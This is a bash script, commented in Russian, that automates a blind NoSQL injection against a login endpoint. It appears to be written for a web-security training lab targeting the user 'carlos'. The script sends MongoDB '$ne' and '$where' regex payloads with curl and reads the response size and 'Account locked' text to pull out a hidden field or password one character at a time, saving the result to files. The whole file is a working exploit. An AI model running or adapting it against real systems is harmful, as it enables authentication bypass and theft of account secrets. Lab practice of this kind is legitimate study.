#!/bin/bash

# URL для отправки запросов
URL="https://......"

# Заголовок с куки
HEADER="Cookie: session=......"

# Файл для сохранения результатов
OUTPUT_FILE="response_results.txt"
PASSWORD_FILE="password_chars.txt"

# Список символов для подстановки вместо FUZZ
CHAR_LIST="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

# Очищаем файлы результатов, если они существуют
> "$OUTPUT_FILE"
> "$PASSWORD_FILE"

echo "Начало отправки запросов..."
echo "======================================"

# Счетчик 
COUNT=0
# Счетчик символов
FOUND_COUNT=0
# Массив для хранения найденных символов пароля
declare -a PASSWORD_CHARS

# Инициализируем массив подчеркиваниями
for ((i=0; i<=20; i++)); do
    PASSWORD_CHARS[$i]="_"
done

# Функция для отправки запроса
send_request() {
    local char=$1
    local kuuuz=$2
    local payload="{\"username\":\"carlos\",\"password\":{\"\$ne\":\"\"},\"\$where\":\"Object.keys(this)[2].match('^.{${kuuuz}}${char}.*\$')\"}"
    
    # ВЫВОДИМ ТЕЛО ЗАПРОСА В КОНСОЛЬ
    echo "POST запрос:"
    echo "$payload"
    echo ""
    
    # Отправляем POST-запрос и сохраняем ответ
    local response
    response=$(curl -s -X POST "$URL" \
        -H "$HEADER" \
        -H "Content-Type: application/json" \
        -d "$payload" \
        -w "\n%{size_download}" \
        --connect-timeout 10 \
        --max-time 15)
    
    # Разделяем тело ответа и его размер
    local body
    local size
    body=$(echo "$response" | head -n -1)
    size=$(echo "$response" | tail -n 1)
    
    # Сохраняем информацию в файл без HTML
    echo "======================================" >> "$OUTPUT_FILE"
    echo "Позиция: $kuuuz, Символ: $char" >> "$OUTPUT_FILE"
    echo "Размер ответа: $size байт" >> "$OUTPUT_FILE"
    echo "Найден 'Account locked': $(echo "$body" | grep -q "Account locked" && echo "ДА" || echo "НЕТ")" >> "$OUTPUT_FILE"
    echo "" >> "$OUTPUT_FILE"
    
    # Проверяем содержит ли ответ строку "Account locked" и размер больше 3392 бит (424 байт)
    if echo "$body" | grep -q "Account locked" && [ "$size" -gt 424 ]; then
        echo "[✓] Позиция $kuuuz: символ '$char' ПОДОШЕЛ ($size байт)"
        echo ""
        
        # Сохраняем найденный символ
        PASSWORD_CHARS[$kuuuz]="$char"
        FOUND_COUNT=$((FOUND_COUNT + 1))
        
        # Записываем в файл символов
        echo "Позиция $kuuuz: $char" >> "$PASSWORD_FILE"
        
        return 0  # Успех - найден нужный ответ
    else
        echo "[✗] Позиция $kuuuz: символ '$char' НЕ ПОДОШЕЛ ($size байт)"
        echo ""
        return 1  # Не подходит
    fi
}

# Функция для вывода текущих данных
print_password() {
    local password=""
    for ((i=0; i<=20; i++)); do
        password="${password}${PASSWORD_CHARS[$i]}"
    done
    echo "$password"
}

# Функция для вывода пароля с позициями
print_password_with_positions() {
    echo "Текущее_Значение:"
    echo "Позиции: 012345678901234567890"
    echo "Значение:  $(print_password)"
    echo ""
    if [ $FOUND_COUNT -gt 0 ]; then
        echo "Найденные символы:"
        for ((i=0; i<=20; i++)); do
            if [ "${PASSWORD_CHARS[$i]}" != "_" ]; then
                echo "  Позиция $i: ${PASSWORD_CHARS[$i]}"
            fi
        done
    fi
}

# Основной цикл для позиций от 0 до 20
for ((kuuuz=0; kuuuz<=20; kuuuz++)); do
    echo ""
    echo "════════════════════════════════════════════════════════════"
    echo "Ищем символ для позиции $kuuuz"
    echo "════════════════════════════════════════════════════════════"
    
    found_for_position=false
    
    # Перебираем все символы для текущей позиции
    for (( i=0; i<${#CHAR_LIST}; i++ )); do
        char="${CHAR_LIST:$i:1}"
        
        # Отправляем запрос
        if send_request "$char" "$kuuuz"; then
            found_for_position=true
            break  # Нашли символ для этой позиции, переходим к следующей позиции
        fi
        
        COUNT=$((COUNT + 1))
        
        # Небольшая пауза между запросами, чтобы не перегружать сервер
        sleep 0.5
    done
    
    # Если для текущей позиции не нашли подходящий символ
    if [ "$found_for_position" = false ]; then
        echo "[!] Для позиции $kuuuz не найден подходящий символ"
        echo "Позиция $kuuuz: не найден" >> "$PASSWORD_FILE"
    fi
    
    # Выводим текущий прогресс
    echo ""
    echo "════════════════════════════════════════════════════════════"
    print_password_with_positions
    echo "════════════════════════════════════════════════════════════"
    echo "Прогресс: $((kuuuz + 1))/21 позиций, найдено $FOUND_COUNT символов"
    echo ""
done

echo ""
echo "════════════════════════════════════════════════════════════════════════════════"
echo "СКАНИРОВАНИЕ ЗАВЕРШЕНО!"
echo "════════════════════════════════════════════════════════════════════════════════"
echo "Всего отправлено запросов: $COUNT"
echo "Найдено символов: $FOUND_COUNT из 21"
echo ""

# найден ли хотя бы один символ
if [ $FOUND_COUNT -eq 0 ]; then
    echo "════════════════════════════════════════════════════════════════════════════════"
    echo "ВНИМАНИЕ: Не найдено ни одного подходящего символа!"
    echo "════════════════════════════════════════════════════════════════════════════════"
    echo "Возможные причины:"
    echo "1. Сессия устарела или неверна"
    echo "2. Изменилась логика работы сервера"
    echo "3. Превышен лимит попыток"
    echo "4. Неверный URL или параметры запроса"
    echo ""
    echo "Проверьте:"
    echo "- Актуальность сессии cookie"
    echo "- Корректность URL"
    echo "- Параметры запроса (регулярное выражение)"
    echo "════════════════════════════════════════════════════════════════════════════════"
    exit 1  # Завершаем скрипт с ошибкой
fi

# Выводим финальный результат
echo "════════════════════════════════════════════════════════════════════════════════"
echo "ФИНАЛЬНЫЙ РЕЗУЛЬТАТ"
echo "════════════════════════════════════════════════════════════════════════════════"

print_password_with_positions
echo ""

# Создаем файл с паролем в одной строке
FINAL_PASSWORD=$(print_password | tr -d '_')
if [ -n "$FINAL_PASSWORD" ]; then
    echo "Данных (без пропусков): $FINAL_PASSWORD" > "final_password.txt"
    echo "════════════════════════════════════════════════════════════════════════════════"
    echo "ИТОГОВОЕ ЗНАЧЕНИЕ: $FINAL_PASSWORD"
    echo "════════════════════════════════════════════════════════════════════════════════"
else
    echo "ВНИМАНИе: данные пусты или содержат только пропуски!"
fi

echo ""
echo "Информация сохранена в файлах:"
echo "1. $OUTPUT_FILE - результаты по позициям (без HTML)"
echo "2. $PASSWORD_FILE - найденные символы по позициям"
if [ -f "final_password.txt" ]; then
    echo "3. final_password.txt - итоговый пароль/данные"
fi
echo ""
